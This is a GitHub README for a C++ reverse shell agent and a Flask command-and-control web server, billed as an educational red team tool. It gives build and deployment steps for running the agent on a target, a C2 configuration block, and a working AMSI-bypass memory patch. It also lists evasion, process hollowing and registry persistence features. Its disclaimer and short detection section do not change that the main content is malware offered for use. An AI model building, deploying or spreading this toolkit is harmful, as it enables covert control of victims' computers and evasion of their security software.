```markdown
# 🔴 Advanced C2 Framework - Educational Red Team Tool

<div align="center">

![Version](https://img.shields.io/badge/version-2.0-blue)
![Platform](https://img.shields.io/badge/platform-Windows-lightgrey)
![Language](https://img.shields.io/badge/language-C%2B%2B%20%7C%20Python-orange)
![License](https://img.shields.io/badge/license-Educational-red)

*A professional-grade Command & Control framework built for educational purposes and authorized penetration testing.*

[Features](#features) • [Installation](#installation) • [Usage](#usage) • [Legal](#legal-disclaimer)

</div>

---

## 🎯 Overview

Advanced C2 Framework is a full-stack offensive security project demonstrating modern red team techniques. The project includes a native C++ reverse shell agent with advanced evasion capabilities and a real-time web-based command interface.

**⚠️ FOR EDUCATIONAL PURPOSES ONLY** - This tool is intended for authorized security testing and research in controlled environments.

---

## ✨ Features

### 🔹 Agent (C++)
- **Advanced Evasion Techniques**
  - AMSI (Antimalware Scan Interface) bypass via memory patching
  - ETW (Event Tracing for Windows) disabling
  - Ntdll unhooking to restore clean syscalls
  - Multi-layer sandbox detection (VM, debugger, emulation)
  
- **Stealth Capabilities**
  - Zero .NET dependencies (pure Win32 API)
  - Time-aware sleep with anti-acceleration
  - Process hollowing and code injection
  - Encrypted C2 communications (XOR encryption)
  
- **Functionality**
  - Stateful shell sessions with working directory tracking
  - Remote command execution
  - Registry persistence mechanisms
  - File system operations

### 🔹 Server (Python + Flask)
- **Modern Web Interface**
  - Real-time agent monitoring via WebSockets
  - Multi-agent management
  - Interactive terminal with command history
  - Responsive UI with glassmorphism design
  
- **Features**
  - Live connection status indicators
  - Command execution tracking
  - Agent statistics dashboard
  - System information display

---

## 🛠️ Installation

### Prerequisites

#### Windows Environment
- **MinGW-w64 (GCC)** or **Visual Studio Build Tools**
- **Python 3.8+**
- **Git**

#### Install Dependencies

**1. Install MinGW (if not installed)**
```bash
# Download MSYS2: https://www.msys2.org/
# After installation, run:
pacman -Syu
pacman -S mingw-w64-x86_64-gcc
```

Add to PATH: `C:\msys64\mingw64\bin`

**2. Install Python Dependencies**
```bash
pip install flask flask-socketio
```

---

## 🚀 Quick Start

### 1. Clone Repository
```bash
git clone https://github.com/sermikro/AdvancedReverseShell.git
cd AdvancedReverseShell
```

### 2. Build Agent
```bash
# Using build script (recommended)
.\build.bat

# Or manual compilation
g++ -O3 -s -static -mwindows src/main.cpp -o ReverseShell.exe -lws2_32 -lwininet -ladvapi32 -lshell32 -liphlpapi
```

**Output:** `output/StealthAgent_XXXXXXXX.exe` or `ReverseShell.exe`

### 3. Start C2 Server
```bash
python c2_server_gui.py
```

Access web interface: **http://localhost:5000**

### 4. Deploy Agent
Execute the compiled agent on the target system:
```bash
.\ReverseShell.exe
```

The agent will appear in the web interface upon successful connection.

---

## 📖 Usage

### Basic Commands

In the web terminal:

```bash
# System information
whoami
hostname
systeminfo

# File operations
dir C:\
cd C:\Windows
type file.txt

# Network
ipconfig
netstat -an

# Persistence
persist

# Exit
exit
```

### Configuration

Edit `src/main.cpp` before building:

```cpp
#define C2_SERVER "127.0.0.1"  // Change to your server IP
#define C2_PORT 4444           // Change port if needed
#define SLEEP_TIME 5000        // Reconnection interval (ms)
#define XOR_KEY 0x42           // Encryption key
```

---

## 🏗️ Project Structure

```
AdvancedReverseShell/
├── src/
│   ├── main.cpp              # Agent main code
│   ├── evasion/
│   │   ├── amsi_bypass.cpp
│   │   ├── etw_bypass.cpp
│   │   ├── unhook.cpp
│   │   └── sandbox_detect.cpp
│   ├── execution/
│   │   ├── shell.cpp
│   │   └── process_hollow.cpp
│   ├── network/
│   │   ├── connection.cpp
│   │   └── encryption.cpp
│   └── persistence/
│       ├── registry.cpp
│       └── schtasks.cpp
├── include/
│   ├── common.h
│   └── stealth.h             # Advanced evasion techniques
├── templates/
│   └── index.html            # Web GUI
├── c2_server_gui.py          # Flask C2 server
├── build.bat                 # Build script
└── README.md
```

---

## 🔬 Technical Details

### Agent Architecture
- **Language:** C++17
- **Compiler:** MinGW GCC 13.2.0
- **Size:** ~200-700KB (depending on build options)
- **Dependencies:** Statically linked (no external DLLs)

### Evasion Techniques

**1. AMSI Bypass**
```cpp
// Patches AmsiScanBuffer to return AMSI_RESULT_NOT_DETECTED
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(pAmsiScanBuffer, patch, sizeof(patch));
```

**2. Sandbox Detection**
- CPU core count check (< 2 cores)
- RAM size verification (< 4GB)
- Disk size check (< 60GB)
- System uptime analysis
- Mouse movement detection
- VM process identification

**3. Communication Protocol**
- XOR encryption for C2 traffic
- Stateful TCP sessions
- Command/response format with delimiters

---

## 🎓 Educational Value

This project demonstrates:
- Windows internals and API programming
- Offensive security techniques
- Network protocol design
- Full-stack web development
- Memory manipulation and patching
- Evasion and anti-detection methods

### Learning Resources
- [Windows API Documentation](https://docs.microsoft.com/en-us/windows/win32/api/)
- [Red Team Handbook](https://github.com/0xsp/Offensive-Security-OSCP-Cheatsheets)
- [Malware Development](https://github.com/vxunderground/MalwareDevelopment)

---

## ⚠️ Legal Disclaimer

**IMPORTANT:** This tool is provided for **EDUCATIONAL PURPOSES ONLY**.

### Authorized Use Only
- ✅ Authorized penetration testing with written permission
- ✅ Personal lab environments and educational research
- ✅ Cybersecurity training and red team exercises
- ✅ Vulnerability assessment with proper authorization

### Prohibited Use
- ❌ Unauthorized access to computer systems
- ❌ Malicious activities or illegal operations
- ❌ Deployment without explicit permission
- ❌ Any activity violating local/international laws

### Liability
The author assumes **NO LIABILITY** for misuse of this tool. Users are solely responsible for ensuring compliance with all applicable laws and regulations. Unauthorized use may result in severe legal consequences.

By using this software, you agree to use it **ONLY** for legal and ethical purposes in authorized environments.

---

## 🛡️ Detection & Defense

This project is detectable by modern security solutions when used without modifications. For defensive purposes:

### Detection Methods
- Signature-based AV (static analysis)
- Behavioral analysis (EDR systems)
- Network monitoring (C2 traffic patterns)
- Memory scanning (runtime detection)

### Recommended Defenses
- Enable Windows Defender with real-time protection
- Deploy EDR solutions (CrowdStrike, SentinelOne, etc.)
- Implement network segmentation
- Use application whitelisting
- Monitor for suspicious process behaviors

---

## 🤝 Contributing

Contributions are welcome for educational improvements:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/improvement`)
3. Commit changes (`git commit -m 'Add educational feature'`)
4. Push to branch (`git push origin feature/improvement`)
5. Open a Pull Request

Please ensure all contributions maintain the educational focus and include appropriate warnings.

---

## 📚 References & Credits

- **AMSI Bypass Techniques:** Research by various security researchers
- **Offensive Security Concepts:** OSCP/OSCE materials
- **Windows Internals:** Microsoft documentation
- **Red Team Tactics:** MITRE ATT&CK Framework

---

## 📞 Contact

**Author:** Saidakbarxon Maxsudxonov (sermikro)  
**Purpose:** Educational cybersecurity research  
**Environment:** Controlled lab environments only  

For questions about ethical security research or educational use cases, feel free to open an issue.

---

## 📄 License

This project is released under an **Educational License**:
- ✅ Use for learning and authorized testing
- ✅ Modification for educational purposes
- ❌ Commercial use prohibited
- ❌ Malicious use strictly forbidden

---

<div align="center">

**⚠️ Remember: With great power comes great responsibility ⚠️**

*Use this knowledge to defend, not to attack.*

</div>
